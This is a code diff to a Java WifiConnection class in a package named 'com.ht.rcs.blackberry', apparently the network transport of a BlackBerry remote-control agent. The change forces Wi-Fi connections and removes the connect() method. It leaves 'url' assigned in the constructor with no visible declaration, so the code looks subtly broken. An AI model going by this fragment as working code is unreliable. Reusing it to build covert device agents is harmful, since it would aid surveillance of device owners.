@@ -13,7 +13,7 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public class WifiConnection extends Connection {
-	//#debug
+    //#debug
     static Debug debug = new Debug("Wifi", DebugLevel.VERBOSE);
 
     private String host;
@@ -27,41 +27,15 @@ public class WifiConnection extends Connection {
         this.host = host_;
         this.port = port_;
         this.ssl = ssl_;
-    }
-
-    public synchronized boolean connect() {
-        String url = "";
+        
+        
         if (ssl) {
             url = "ssl://" + host + ":" + port + ";ConnectionTimeout="
-                    + timeout;
-
+                    + timeout + ";deviceside=true;interface=wifi";
         } else {
             url = "socket://" + host + ":" + port + ";ConnectionTimeout="
-                    + timeout;
+                    + timeout + ";deviceside=true;interface=wifi";
         }
-
-        try {
-            connection = (StreamConnection) Connector.open(url);
-            in = connection.openDataInputStream();
-            out = connection.openDataOutputStream();
-
-            // #ifdef DBC
-//@            Check.ensures(connection != null, "connection_ null");
-            // #endif
-            // #ifdef DBC
-//@            Check.ensures(in != null, "in_ null");
-            // #endif
-            // #ifdef DBC
-//@            Check.ensures(out != null, "out_ null");
-            // #endif
-
-            connected = true;
-
-        } catch (IOException e) {
-            connected = false;
-        }
-
-        return connected;
     }
 
     protected void error(String string) {
